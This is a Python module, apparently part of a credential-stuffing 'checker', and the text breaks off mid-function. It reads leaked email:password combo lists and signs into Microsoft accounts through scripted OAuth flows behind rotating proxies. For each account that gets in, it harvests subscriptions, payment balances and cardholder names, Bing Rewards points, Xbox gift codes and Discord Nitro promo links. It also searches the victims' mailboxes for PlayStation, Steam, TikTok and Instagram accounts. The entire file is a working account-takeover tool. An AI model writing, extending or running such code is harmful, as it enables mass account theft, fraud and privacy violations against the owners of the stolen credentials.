import re
import json
import uuid
import time
import requests
from datetime import datetime, timezone
from urllib.parse import quote, unquote
from bs4 import BeautifulSoup
from CONFIG.config import UA, MAX_RETRIES
from API.social import (
    _get_followers_range, _search_tiktok_inbox, _get_tiktok_profile,
    _get_tiktok_profile_web, _search_instagram_inbox, _get_instagram_profile
)

SKIP_RE = [
    re.compile(r'^\s*[\u2514\u251C\u2500\u2550\u2554\u255A\u2551\u2557\u255D\u2560\u2563\u2510\u2518\u250C\u252C\u2534\u253C\u2502]'),
    re.compile(r'^\s*\[(?:ACTIVE|PERPETUAL|INFO)\]', re.I),
    re.compile(r'^\s*Generated:', re.I),
    re.compile(r'^\s*Total\s+Hits:', re.I),
    re.compile(r'^\s*={3,}'),
    re.compile(r'^\s*-{3,}'),
    re.compile(r'^\s*#'),
]
EM_RE = re.compile(r'([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})')
DISC_RE = re.compile(
    r'https?://(?:discord\.gift|discord\.com/gifts|promos\.discord\.gg|discord\.com/billing/promotions)/([A-Za-z0-9_-]+)',
    re.I)
XCODE_RE = re.compile(r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}')

PROXY_EXC = (
    requests.exceptions.ProxyError,
    requests.exceptions.Timeout,
    requests.exceptions.SSLError,
    requests.exceptions.ConnectionError,
)


def parse_combos(lines_list):
    combos = []
    bad = 0
    total = len(lines_list)
    for line in lines_list:
        line = line.strip()
        if not line:
            bad += 1
            continue
        skip = False
        for p in SKIP_RE:
            if p.match(line):
                skip = True
                break
        if skip:
            bad += 1
            continue
        em = EM_RE.search(line)
        if not em:
            bad += 1
            continue
        email = em.group(1)
        rest = line[em.end():]
        rest = re.sub(r'^[\s:;|]+', '', rest)
        parts = re.split(r'\s*\|\s*', rest, 1)
        pwd = parts[0].strip() if parts else ""
        if not pwd or len(pwd) < 3:
            bad += 1
            continue
        combos.append((email, pwd))
    return combos, total, bad


def _clean(url):
    if not url:
        return url
    return url.replace("&amp;", "&").replace("&#x3a;", ":").replace("&#x2f;", "/")


def _dosubmit(t):
    return "DoSubmit" in t or "document.fmHF.submit" in t or ('onload="' in t and 'submit()' in t.lower())


def _form_sub(sess, resp, hops=10):
    c = resp
    for _ in range(hops):
        if not _dosubmit(c.text):
            break
        am = re.search(r'<form[^>]*action="([^"]+)"', c.text, re.I)
        if not am:
            break
        act = _clean(am.group(1))
        fd = {}
        for n, v in re.findall(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"', c.text):
            fd[n] = _clean(v)
        for v, n in re.findall(r'<input[^>]*value="([^"]*)"[^>]*name="([^"]*)"', c.text):
            if n not in fd:
                fd[n] = _clean(v)
        mm = re.search(r'<form[^>]*method="([^"]+)"', c.text, re.I)
        meth = mm.group(1).upper() if mm else "POST"
        h = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
             "Accept": "text/html,*/*", "Referer": c.url}
        if meth == "GET":
            c = sess.get(act, params=fd, headers=h, allow_redirects=True, timeout=15)
        else:
            c = sess.post(act, data=fd, headers=h, allow_redirects=True, timeout=15)
    return c


def _issue(url, text=""):
    c = (_clean(url) + " " + text).lower() if url else text.lower()
    if "account.live.com/recover" in c: return "2FA"
    if "account.live.com/abuse" in c or "/abuse?mkt=" in c: return "2FA"
    if "identity/confirm" in c: return "2FA"
    if "account or password is incorrect" in c or "that password is incorrect" in c: return "BAD"
    if "account doesn" in c: return "BAD"
    if "account has been locked" in c or "account has been suspended" in c: return "2FA"
    if "cancel?mkt=" in c: return "2FA"
    return None


def _follow(sess, resp, hops=12):
    c = resp
    bh = {"User-Agent": UA, "Accept": "text/html,*/*"}
    for _ in range(hops):
        iss = _issue(c.url, c.text)
        if iss:
            return c
        if _dosubmit(c.text):
            c = _form_sub(sess, c)
            continue
        m = re.search(r'<meta[^>]*http-equiv="refresh"[^>]*content="[^;]*;\s*([^"]+)"', c.text, re.I)
        if m:
            bh["Referer"] = c.url
            try:
                c = sess.get(_clean(m.group(1).strip()), headers=bh, allow_redirects=True, timeout=15)
            except:
                break
            continue
        found = False
        for p in [r'window\.location\.replace\("([^"]+)"\)', r'window\.location\.href\s*=\s*"([^"]+)"']:
            m2 = re.search(p, c.text)
            if m2:
                bh["Referer"] = c.url
                try:
                    c = sess.get(_clean(m2.group(1)), headers=bh, allow_redirects=True, timeout=15)
                except:
                    pass
                found = True
                break
        if not found:
            break
    return c


def ms_login(email, pwd, pxr_inst):
    sess = requests.Session()
    px = pxr_inst.get() if pxr_inst else None
    if px:
        sess.proxies = px
    try:
        r1 = sess.get(
            "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email,
            headers={"User-Agent": "Dalvik/2.1.0", "X-CorrelationId": str(uuid.uuid4())}, timeout=12)
        if r1.status_code != 200:
            return sess, "ERROR", None, None
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]):
            return sess, "BAD", None, None
        if "MSAccount" not in r1.text:
            return sess, "BAD", None, None

        r2 = sess.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            "?client_info=1&haschrome=1&login_hint=" + email +
            "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={"User-Agent": UA}, allow_redirects=True, timeout=12)
        um = re.search(r'urlPost":"([^"]+)"', r2.text)
        pm = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not um or not pm:
            return sess, "ERROR", None, None
        post_url = _clean(um.group(1).replace("\\/", "/"))
        ppft = pm.group(1)

        r3 = sess.post(post_url,
            data=("i13=1&login=" + email + "&loginfmt=" + email +
                  "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" +
                  pwd + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                  "&hpgrequestid=&PPFT=" + ppft +
                  "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
                  "&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"),
            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA,
                     "Origin": "https://login.live.com", "Referer": r2.url},
            allow_redirects=False, timeout=12)

        loc = _clean(r3.headers.get("Location", ""))
        iss = _issue(loc, r3.text)
        if iss:
            return sess, iss, None, None

        if not loc and _dosubmit(r3.text):
            r3f = _form_sub(sess, r3)
            iss = _issue(r3f.url, r3f.text)
            if iss:
                return sess, iss, None, None
            loc = r3f.url

        if not loc:
            nm = re.search(r'navigate\("([^"]+)"\)', r3.text)
            if nm:
                loc = _clean(nm.group(1))

        code = None
        if loc:
            iss = _issue(loc)
            if iss:
                return sess, iss, None, None
            cm = re.search(r'code=([^&]+)', loc)
            if cm:
                code = cm.group(1)

        if not code:
            return sess, "BAD", None, None

        cid = sess.cookies.get("MSPCID", "")
        if cid:
            cid = cid.upper()

        tr = sess.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=("client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                  "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                  "&grant_type=authorization_code&code=" + code +
                  "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"),
            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=12)

        access_token = None
        if tr.status_code == 200 and "access_token" in tr.text:
            try:
                access_token = tr.json().get("access_token")
            except:
                pass

        if not cid:
            cid = sess.cookies.get("MSPCID", "")
            if cid:
                cid = cid.upper()

        bh = {"User-Agent": UA, "Accept": "text/html,*/*"}
        try:
            _follow(sess, sess.get(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                "?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-client-signin-oauth"
                "&response_type=code&scope=openid%20profile%20offline_access"
                "&prompt=none&login_hint=" + email,
                headers=bh, allow_redirects=True, timeout=15))
        except:
            pass

        try:
            _follow(sess, sess.get(
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000044199E82&scope=service::account.microsoft.com::MBI_SSL"
                "&response_type=token&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin"
                "&prompt=none&login_hint=" + email,
                headers=bh, allow_redirects=True, timeout=15))
        except:
            pass

        if px:
            pxr_inst.ok(px)
        return sess, "OK", access_token, cid

    except PROXY_EXC:
        if px:
            pxr_inst.fail(px)
        return sess, "ERROR", None, None
    except:
        return sess, "ERROR", None, None


def _extract_svcs(html):
    m = re.search(r'JSON\.stringify\((\{"summaryData":\{"isOperationSuccessful".+?\})\)\s*;', html, re.DOTALL)
    if not m:
        for m2 in re.finditer(r'JSON\.stringify\((\{.+?\})\)\s*[;,]', html, re.DOTALL):
            try:
                o = json.loads(m2.group(1))
                if isinstance(o, dict) and "summaryData" in o:
                    m = m2
                    break
            except:
                pass
    if not m:
        return []
    try:
        data = json.loads(m.group(1))
    except:
        return []
    sm = data.get("summaryData", data)
    svcs = []
    for key, label in [("active", "ACTIVE"), ("trial", "TRIAL"), ("canceled", "CANCELED"),
                       ("commercial", "COMMERCIAL"), ("perpetual", "PERPETUAL"),
                       ("expired", "EXPIRED"), ("pending", "PENDING")]:
        for it in (sm.get(key) or []):
            if not isinstance(it, dict):
                continue
            svcs.append({
                "cat": label,
                "name": it.get("name") or it.get("displayName") or "Unknown",
                "days": None, "auto": None, "expiry": None, "billing": None,
                "bill_curr": None, "trial": bool(it.get("isTrial")),
            })
    return svcs


def _enrich(sess, svcs):
    try:
        r = sess.get("https://account.microsoft.com/services/api/subscriptions",
                     headers={"User-Agent": UA, "Accept": "application/json",
                              "Referer": "https://account.microsoft.com/services"}, timeout=10)
        if r.status_code != 200:
            return svcs
        data = r.json()
        items = data if isinstance(data, list) else None
        if not items and isinstance(data, dict):
            for k in ["subscriptions", "active", "items", "data", "value"]:
                if k in data and isinstance(data[k], list):
                    items = data[k]
                    break
        if not items:
            return svcs

        def scan(obj, keys):
            if isinstance(obj, dict):
                for k in keys:
                    if k in obj and obj[k]:
                        return obj[k]
                for v in obj.values():
                    r2 = scan(v, keys)
                    if r2:
                        return r2
            elif isinstance(obj, list):
                for i in obj:
                    r2 = scan(i, keys)
                    if r2:
                        return r2
            return None

        def pdate(v):
            if not v:
                return None
            s2 = str(v).strip()
            for fmt in ["%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d"]:
                try:
                    return datetime.strptime(s2[:19], fmt[:len(s2[:19])])
                except:
                    pass
            return None

        for it in items:
            if not isinstance(it, dict):
                continue
            iname = (it.get("name") or it.get("displayName") or "").lower()
            matched = None
            for sv in svcs:
                if sv["name"].lower() in iname or iname in sv["name"].lower():
                    matched = sv
                    break
            if not matched:
                continue
            v = scan(it, ["endDate", "expirationDate", "expiryDate", "subscriptionEndDate"])
            if v:
                dt = pdate(v)
                if dt:
                    matched["expiry"] = dt
                    now = datetime.now(timezone.utc)
                    if dt.tzinfo is None:
                        dt = dt.replace(tzinfo=timezone.utc)
                    matched["days"] = (dt - now).days
            if matched["days"] is None:
                v = scan(it, ["nextBillingDate", "renewalDate", "nextRenewalDate"])
                if v:
                    dt = pdate(v)
                    if dt:
                        now = datetime.now(timezone.utc)
                        if dt.tzinfo is None:
                            dt = dt.replace(tzinfo=timezone.utc)
                        matched["days"] = (dt - now).days
                        matched["expiry"] = dt
            v = scan(it, ["amount", "price", "billingAmount", "totalAmount"])
            if v is not None:
                matched["billing"] = v
            v = scan(it, ["currency", "currencyCode"])
            if v:
                matched["bill_curr"] = v
            v = scan(it, ["autoRenew", "isAutoRenewEnabled"])
            if v is not None:
                matched["auto"] = bool(v)
    except:
        pass
    return svcs


def check_services(sess, email):
    bh = {"User-Agent": UA, "Accept": "text/html,*/*"}
    try:
        r6 = _follow(sess, sess.get("https://account.microsoft.com/services?ref=xboxme",
                                    headers=bh, allow_redirects=True, timeout=15))
        if "complete-sso" in r6.url:
            sm = re.search(r'complete-sso-with-redirect\?state=[^"\'&\s]+', r6.text)
            if sm:
                r6 = _follow(sess, sess.get(
                    "https://account.microsoft.com/auth/" + sm.group(0),
                    headers=bh, allow_redirects=True, timeout=15))
        if "login" in r6.url.lower() and "account.microsoft.com/services" not in r6.url:
            r6 = _follow(sess, sess.get("https://account.microsoft.com/services",
                                        headers=bh, allow_redirects=True, timeout=15))
        svcs = _extract_svcs(r6.text)
        svcs = _enrich(sess, svcs)
        return svcs
    except:
        return []


def fmt_svc(sv):
    parts = [f"[{sv['cat']}] {sv['name']}"]
    if sv.get("days") is not None:
        parts.append(f"Days: {sv['days']}")
    if sv.get("auto") is not None:
        parts.append(f"AutoRenew: {'YES' if sv['auto'] else 'NO'}")
    if sv.get("expiry"):
        parts.append(f"Expires: {sv['expiry'].strftime('%Y-%m-%d')}")
    if sv.get("billing") is not None:
        b = str(sv["billing"])
        if sv.get("bill_curr"):
            b += f" {sv['bill_curr']}"
        parts.append(f"Billing: {b}")
    return " | ".join(parts)


def classify_svc(name):
    nl = name.lower()
    if "game pass ultimate" in nl: return "xgpu"
    if "game pass" in nl and "essential" in nl: return "xgpe"
    if "game pass" in nl: return "xgpp"
    if "365" in nl or "office" in nl: return "m365"
    return "other_svc"


def check_balance(sess):
    try:
        uid = str(uuid.uuid4()).replace('-', '')[:16]
        state_val = json.dumps({"userId": uid, "scopeSet": "pidl"})
        r = sess.get(
            "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
            "&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
            "&state=" + quote(state_val) + "&prompt=none",
            headers={"User-Agent": UA, "Referer": "https://account.microsoft.com/"},
            allow_redirects=True, timeout=15)
        tk = None
        for p in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
            m = re.search(p, r.text + " " + r.url)
            if m:
                tk = unquote(m.group(1))
                break
        if not tk:
            return None, None, None
        rp = sess.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
            headers={"User-Agent": UA, "Accept": "application/json",
                     "Authorization": f'MSADELEGATE1.0="{tk}"',
                     "Origin": "https://account.microsoft.com"}, timeout=12)
        if rp.status_code != 200:
            return None, None, None
        txt = rp.text
        bal, cur, holder = None, None, None
        bm = re.search(r'"balance"\s*:\s*([0-9.]+)', txt)
        if bm: bal = float(bm.group(1))
        cm = re.search(r'"currency"\s*:\s*"([^"]+)"', txt)
        if cm: cur = cm.group(1)
        hm = re.search(r'"accountHolderName"\s*:\s*"([^"]+)"', txt)
        if hm: holder = hm.group(1)
        return bal, cur, holder
    except:
        return None, None, None


def check_rp(sess):
    try:
        bh = {"User-Agent": UA}
        try:
            ra = sess.get(
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000040170455&scope=service::bing.com::MBI_SSL"
                "&response_type=token"
                "&redirect_uri=https%3A%2F%2Fwww.bing.com%2Ffd%2Fauth%2Fsignin%3Faction%3Dinteractive"
                "&prompt=none", headers=bh, allow_redirects=True, timeout=12)
            if _dosubmit(ra.text):
                _form_sub(sess, ra)
        except:
            pass
        time.sleep(0.3)
        r = sess.get("https://rewards.bing.com/dashboard", headers=bh, allow_redirects=True, timeout=15)
        if _dosubmit(r.text):
            r = _form_sub(sess, r)
        pg = r.text
        pts = None
        for p in [r'"availablePoints"\s*:\s*(\d+)', r'availablePoints["\s:=]+(\d+)',
                  r'"redeemable"\s*:\s*(\d+)']:
            m = re.search(p, pg)
            if m:
                try:
                    pts = int(m.group(1).replace(',', ''))
                    break
                except:
                    pass
        if pts is None:
            try:
                ar = sess.get("https://rewards.bing.com/api/getuserinfo?type=1",
                              headers={"User-Agent": UA, "Referer": "https://rewards.bing.com/dashboard"},
                              timeout=10)
                m = re.search(r'"availablePoints"\s*:\s*(\d+)', ar.text)
                if m:
                    pts = int(m.group(1))
            except:
                pass
        return pts
    except:
        return None


def get_xbl(sess):
    try:
        r = sess.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en&prompt=none",
            headers={"User-Agent": UA}, allow_redirects=True, timeout=12)
        if _dosubmit(r.text):
            r = _form_sub(sess, r)
        tm = re.search(r'access_token=([^&]+)', r.url)
        if not tm:
            return None
        rps = tm.group(1)
        xh = {"User-Agent": UA, "Content-Type": "application/json", "x-xbl-contract-version": "1"}
        ur = sess.post("https://user.auth.xboxlive.com/user/authenticate", headers=xh,
                       json={"Properties": {"AuthMethod": "RPS", "RpsTicket": rps,
                                            "SiteName": "user.auth.xboxlive.com"},
                             "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=10)
        if ur.status_code != 200:
            return None
        ut = ur.json().get("Token")
        if not ut:
            return None
        xr = sess.post("https://xsts.auth.xboxlive.com/xsts/authorize", headers=xh,
                       json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [ut]},
                             "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=10)
        d = xr.json()
        if "Token" not in d:
            return None
        return f"XBL3.0 x={d['DisplayClaims']['xui'][0]['uhs']};{d['Token']}"
    except:
        return None


def extract_promo_codes(text):
    """Extract Discord promo links and Xbox codes from raw text."""
    found = []
    seen = set()

    # Discord gift / promo links
    discord_patterns = [
        r'https?://(?:discord\.gift|discord\.com/gifts|promos\.discord\.gg|discordapp\.com/gifts|discord\.com/billing/promotions)/([A-Za-z0-9_-]+)',
        r'https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/(?:gifts|billing/promotions)/([A-Za-z0-9_-]+)',
        r'"(https?://(?:discord\.gift|promos\.discord\.gg|discord\.com/(?:gifts|billing/promotions))/[A-Za-z0-9_-]+)"',
    ]
    for pat in discord_patterns:
        for m in re.finditer(pat, text, re.I):
            full = m.group(0).strip('"').strip("'")
            if full not in seen:
                seen.add(full)
                found.append(("DISCORD_PROMO", full))

    # Xbox 25-char codes
    for m in re.finditer(r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}', text):
        val = m.group()
        if val not in seen:
            seen.add(val)
            found.append(("XBOX_CODE", val))

    # JSON code/token fields
    for m in re.finditer(
        r'"(?:code|token|promotionCode|giftCode|promoCode|redeemCode)"\s*:\s*"([A-Za-z0-9_\-]{5,})"',
        text,
        re.I,
    ):
        val = m.group(1)
        if len(val) >= 10 and val not in seen:
            seen.add(val)
            found.append(("JSON_CODE", val))

    # Any URL with redeem/gift/promo/nitro
    for m in re.finditer(
        r'https?://[^\s"\'<>]+(?:redeem|gift|promo|nitro)[^\s"\'<>]*', text, re.I
    ):
        url = m.group()
        if url not in seen:
            seen.add(url)
            found.append(("REDEEM_URL", url))

    # resource fields with discord
    for m in re.finditer(r'"resource"\s*:\s*"(https?://[^"]+)"', text):
        url = m.group(1)
        if ("discord" in url.lower() or "nitro" in url.lower()) and url not in seen:
            seen.add(url)
            found.append(("RESOURCE_URL", url))

    return found


def check_discord(sess, xbl, pxr_inst):
    """Fetch all promo endpoints for Discord Nitro codes."""
    found = []
    if not xbl:
        return found

    ah = {"authorization": xbl, "User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json"}

    endpoints = [
        ("POST", "https://profile.gamepass.com/v2/offers/A3525E6D4370403B9763BCFA97D383D9/"),
        ("GET", "https://profile.gamepass.com/v1/perks"),
        ("GET", "https://profile.gamepass.com/v2/perks"),
        ("GET", "https://profile.gamepass.com/v1/perks/active"),
        ("GET", "https://profile.gamepass.com/v2/perks/active"),
        ("GET", "https://profile.gamepass.com/v1/profile"),
        ("GET", "https://profile.gamepass.com/v2/profile"),
    ]

    all_codes = []

    for meth, url in endpoints:
        try:
            px = pxr_inst.get() if pxr_inst else None
            resp = None

            for attempt in range(MAX_RETRIES):
                try:
                    if meth == "GET":
                        resp = sess.get(url, headers=ah, proxies=px or {}, timeout=15)
                    else:
                        resp = sess.post(url, headers=ah, proxies=px or {}, timeout=15)

                    if resp.status_code == 200:
                        if px and pxr_inst:
                            pxr_inst.ok(px)
                        break
                    elif resp.status_code == 429:
                        time.sleep(3 * (attempt + 1))
                        continue
                    else:
                        resp = None
                        break

                except PROXY_EXC:
                    if px and pxr_inst:
                        pxr_inst.fail(px)
                    time.sleep(2)
                    px = pxr_inst.get() if pxr_inst else None
                    resp = None
                    continue
                except Exception:
                    resp = None
                    break

            if resp is None:
                continue

            body = resp.text
            codes = extract_promo_codes(body)
            for ctype, cval in codes:
                if (ctype, cval) not in [(c[0], c[1]) for c in all_codes]:
                    all_codes.append((ctype, cval, url))

        except Exception:
            continue

    # Filter for Discord promos only
    discord_promos = [c for c in all_codes if c[0] in ("DISCORD_PROMO", "REDEEM_URL", "RESOURCE_URL")]

    # Return as (link, "FOUND") tuples
    for ctype, cval, src in discord_promos:
        if cval not in [x[0] for x in found]:
            found.append((cval, "FOUND"))

    return found


def disc_status(link, pxr_inst):
    try:
        m = re.search(r'/([A-Za-z0-9_-]+)$', link)
        if not m:
            return "invalid"

        code = m.group(1)

        for attempt in range(MAX_RETRIES):
            current_proxy = None

            try:
                current_proxy = pxr_inst.get() if pxr_inst else None
                proxies = current_proxy if current_proxy else None

                r = requests.get(
                    f"https://discord.com/api/v10/entitlements/gift-codes/{code}",
                    headers={
                        "User-Agent": UA,
                        "Accept": "application/json"
                    },
                    proxies=proxies,
                    timeout=10,
                )

                # SUCCESS RESPONSE
                if r.status_code == 200:
                    data = r.json()

                    # Revoked
                    if data.get("revoked", False):
                        return "claimed"

                    # Expired
                    expires_at = data.get("expires_at")
                    if expires_at:
                        try:
                            exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
                            if exp_time < datetime.now(timezone.utc):
                                return "expired"
                        except:
                            pass

                    # Usage check (most reliable)
                    uses = data.get("uses", 0)
                    max_uses = data.get("max_uses", 1)

                    if uses >= max_uses:
                        return "claimed"

                    # If still usable
                    return "unclaimed"

                # NOT FOUND
                elif r.status_code == 404:
                    return "invalid"

                # RATE LIMITED
                elif r.status_code == 429:
                    retry_after = r.json().get("retry_after", 5) if r.text else 5
                    time.sleep(retry_after)
                    continue

                # SERVER ERROR → RETRY
                elif r.status_code >= 500:
                    time.sleep(2)
                    continue

                else:
                    return "unknown"

            except PROXY_EXC:
                if current_proxy and pxr_inst:
                    pxr_inst.fail(current_proxy)
                time.sleep(2)
                continue

            except Exception:
                return "unknown"

        return "unknown"

    except Exception:
        return "unknown"


def check_xbox_codes(sess):
    codes = []
    try:
        bh = {"User-Agent": UA, "Referer": "https://rewards.bing.com/"}
        r = sess.get("https://rewards.bing.com/redeem/orderhistory", headers=bh, allow_redirects=True, timeout=15)
        if _dosubmit(r.text):
            r = _form_sub(sess, r)
            r = sess.get("https://rewards.bing.com/redeem/orderhistory", headers=bh, allow_redirects=True, timeout=15)
        soup = BeautifulSoup(r.text, 'html.parser')
        vt = ""
        ti = soup.find('input', attrs={'name': '__RequestVerificationToken'})
        if ti and ti.get('value'):
            vt = ti['value']
        table = soup.find('table', class_='table')
        if not table:
            return codes
        for row in table.find_all('tr'):
            cells = row.find_all(['td', 'th'])
            if len(cells) < 3:
                continue
            btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
            if not btn:
                continue
            aurl = btn.get('data-actionurl', '').replace('&amp;', '&')
            title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
            if any(kw in title.lower() for kw in ['gift card', 'amazon', 'walmart', 'target', 'visa']):
                continue
            if aurl:
                if aurl.startswith('/'):
                    aurl = 'https://rewards.bing.com' + aurl
                try:
                    pd = {}
                    if vt:
                        pd['__RequestVerificationToken'] = vt
                    cr = sess.post(aurl, data=pd,
                                   headers={"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
                    m = XCODE_RE.search(cr.text)
                    if m:
                        codes.append((m.group(), title))
                except:
                    pass
    except:
        pass
    return codes


def _search_mail(sess, access_token, cid, query):
    if not access_token or not cid:
        return 0
    try:
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                "From": 0,
                "Query": {"QueryString": query},
                "Size": 50,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        headers = {
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Authorization': f'Bearer {access_token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json'
        }
        r = sess.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if 'EntitySets' in data and data['EntitySets']:
                es = data['EntitySets'][0]
                if 'ResultSets' in es and es['ResultSets']:
                    return es['ResultSets'][0].get('Total', 0)
        return 0
    except:
        return 0


def check_psn(sess, access_token, cid):
    return _search_mail(sess, access_token, cid,
                        "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation")


def check_steam(sess, access_token, cid):
    return _search_mail(sess, access_token, cid, "noreply@steampowered.com OR steam")


def check_supercell(sess, access_token, cid):
    found_games = []
    games = ["Clash of Clans", "Clash Royale", "Brawl Stars", "Hay Day", "Boom Beach"]
    for game in games:
        try:
            count = _search_mail(sess, access_token, cid, game)
            if count > 0:
                found_games.append(game)
            time.sleep(0.2)
        except:
            continue
    return found_games


def check_tiktok(sess, access_token, cid):
    try:
        inbox_result = _search_tiktok_inbox(sess, access_token, cid)
        if not inbox_result or not inbox_result.get('username'):
            return None
        username = inbox_result['username']
        emails_count = inbox_result.get('emails_count', 0)
        profile = _get_tiktok_profile(sess, username, email=None)
        if not profile:
            profile = _get_tiktok_profile_web(username)
        if profile:
            return {
                'username': username,
                'emails_count': emails_count,
                'full_name': profile.get('full_name', 'N/A'),
                'followers': profile.get('followers', 0),
                'following': profile.get('following', 0),
                'likes': profile.get('likes', 0),
                'videos': profile.get('videos', 0),
                'verified': profile.get('verified', False),
                'private': profile.get('private', False),
                'bio': profile.get('bio', ''),
                'avatar_url': profile.get('avatar_url', ''),
                'create_time': profile.get('create_time', 0),
                'user_id': profile.get('id', ''),
                'region': profile.get('region', 'Unknown'),
                'language': profile.get('language', 'Unknown')
            }
        return {'username': username, 'emails_count': emails_count}
    except:
        return None


def check_instagram(sess, access_token, cid):
    try:
        inbox_result = _search_instagram_inbox(sess, access_token, cid)
        if not inbox_result or not inbox_result.get('username'):
            return None
        username = inbox_result['username']
        emails_count = inbox_result.get('emails_count', 0)
        profile = _get_instagram_profile(username)
        if profile:
            return {
                'username': username,
                'emails_count': emails_count,
                'full_name': profile.get('full_name', 'N/A'),
                'followers': profile.get('followers', 0),
                'following': profile.get('following', 0),
                'posts': profile.get('posts', 0),
                'verified': profile.get('verified', False),
                'private': profile.get('private', False),
                'bio': profile.get('bio', ''),
                'avatar_url': profile.get('profile_pic', ''),
                'user_id': profile.get('user_id', ''),
                'professional': profile.get('professional', False),
                'category': profile.get('category', 'N/A'),
                'external_url': profile.get('external_url', 'N/A'),
                'email': profile.get('email', 'N/A'),
                'phone': profile.get('phone', 'N/A')
            }
        return {'username': username, 'emails_count': emails_count}
    except:
        return None


def check_minecraft_via_xbox(sess):
    try:
        r = sess.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en&prompt=none",
            headers={"User-Agent": UA}, allow_redirects=True, timeout=12)
        if _dosubmit(r.text):
            r = _form_sub(sess, r)
        tm = re.search(r'access_token=([^&]+)', r.url)
        if not tm:
            return None, None
        rps_ticket = tm.group(1)
        xh = {"User-Agent": UA, "Content-Type": "application/json", "x-xbl-contract-version": "1"}
        ur = sess.post("https://user.auth.xboxlive.com/user/authenticate", headers=xh,
                       json={"Properties": {"AuthMethod": "RPS", "RpsTicket": rps_ticket,
                                            "SiteName": "user.auth.xboxlive.com"},
                             "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=10)
        if ur.status_code != 200:
            return None, None
        user_token = ur.json().get("Token")
        if not user_token:
            return None, None
        xr = sess.post("https://xsts.auth.xboxlive.com/xsts/authorize", headers=xh,
                       json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                             "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, timeout=10)
        xd = xr.json()
        if "Token" not in xd:
            xr = sess.post("https://xsts.auth.xboxlive.com/xsts/authorize", headers=xh,
                           json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
